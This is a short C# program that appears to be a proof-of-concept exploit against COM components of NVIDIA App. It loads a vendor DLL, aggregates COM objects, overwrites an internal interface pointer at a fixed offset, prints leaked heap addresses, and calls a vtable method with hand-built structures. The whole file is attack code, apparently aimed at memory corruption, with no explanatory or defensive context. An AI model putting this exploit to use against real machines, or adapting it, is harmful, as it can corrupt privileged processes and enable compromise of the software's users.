using System;using System.Runtime.InteropServices;using System.Threading;
class H{
 static readonly Guid CLSID=new Guid("3F6374C2-3540-476A-A123-D1DA2B6DDF86");
 static readonly Guid IIDU=new Guid("00000000-0000-0000-C000-000000000046");
 static readonly Guid IIDO=new Guid("627D7951-9643-4DE6-898F-6C6B766AAB39");
 [DllImport("ole32")] static extern int CoInitializeEx(IntPtr p,uint f);
 [DllImport("ole32")] static extern int CoCreateInstance(ref Guid c,IntPtr o,uint ctx,ref Guid i,out IntPtr p);
 [DllImport("kernel32",CharSet=CharSet.Unicode)] static extern IntPtr LoadLibrary(string p);
 static void Main(){
  CoInitializeEx(IntPtr.Zero,2);
  LoadLibrary(@"C:\Program Files\NVIDIA Corporation\NVIDIA App\NvCpl\nvxdbat.dll");
  object sync=Activator.CreateInstance(Type.GetTypeFromProgID("NvXDCore.SyncProxy"));
  IntPtr su=Marshal.GetIUnknownForObject(sync);
  Guid c=CLSID,i=IIDU; IntPtr f; CoCreateInstance(ref c,su,0x402,ref i,out f);
  IntPtr iface=IntPtr.Add(f,0x18);
  Guid o=IIDO; IntPtr sdOld; Marshal.QueryInterface(f,ref o,out sdOld);
  Marshal.WriteIntPtr(iface,0x40,sdOld);
  Console.WriteLine("FILTER="+f.ToString("X"));
  Console.WriteLine("IFACE="+iface.ToString("X"));
  Console.WriteLine("SDOLD="+sdOld.ToString("X"));
  Console.WriteLine("CACHE="+Marshal.ReadIntPtr(iface,0x40).ToString("X"));
  Console.WriteLine("PID="+System.Diagnostics.Process.GetCurrentProcess().Id);
  Console.Out.Flush();
  Thread.Sleep(3000);
  // call get
  var get=(FuncGet)Marshal.GetDelegateForFunctionPointer(Marshal.ReadIntPtr(Marshal.ReadIntPtr(iface),3*IntPtr.Size),typeof(FuncGet));
  IntPtr coll=Marshal.AllocCoTaskMem(0x20), items=Marshal.AllocCoTaskMem(0x40), data=Marshal.AllocCoTaskMem(0x20);
  for(int n=0;n<0x20;n++){Marshal.WriteByte(coll,n,0);Marshal.WriteByte(data,n,0);}
  for(int n=0;n<0x40;n++) Marshal.WriteByte(items,n,0);
  Marshal.WriteIntPtr(coll,0,items); Marshal.WriteInt64(coll,8,1);
  Marshal.WriteInt16(items,16,1); Marshal.WriteInt16(items,18,0x7d); Marshal.WriteInt32(items,20,4); Marshal.WriteIntPtr(items,24,data);
  Marshal.WriteInt32(data,0,3); Marshal.WriteInt32(data,4,4);
  Console.WriteLine("GET..."); Console.Out.Flush();
  int hr=get(iface,coll);
  Console.WriteLine("HR=0x"+hr.ToString("X8")); Console.Out.Flush();
  Thread.Sleep(2000);
 }
 [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int FuncGet(IntPtr s,IntPtr a);
}
